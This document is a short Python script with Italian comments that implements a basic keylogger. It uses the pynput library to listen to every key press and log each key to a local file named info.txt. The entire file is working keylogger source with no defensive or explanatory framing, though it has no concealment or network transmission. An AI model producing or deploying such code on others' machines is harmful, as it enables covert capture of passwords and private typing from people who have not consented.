# importo la libreria pynput 
from pynput.keyboard import Key, Listener
import logging

# registra tutte le info e salvale in un file chiamato info.txt
logging.basicConfig(filename=("" + "info.txt"), level=logging.DEBUG)

# definiamo una funzione chiamata reg_tasti
def reg_tasti(key):
    logging.info(str(key))

# rimani in ascolto
with Listener(on_press=reg_tasti) as log:
    log.join()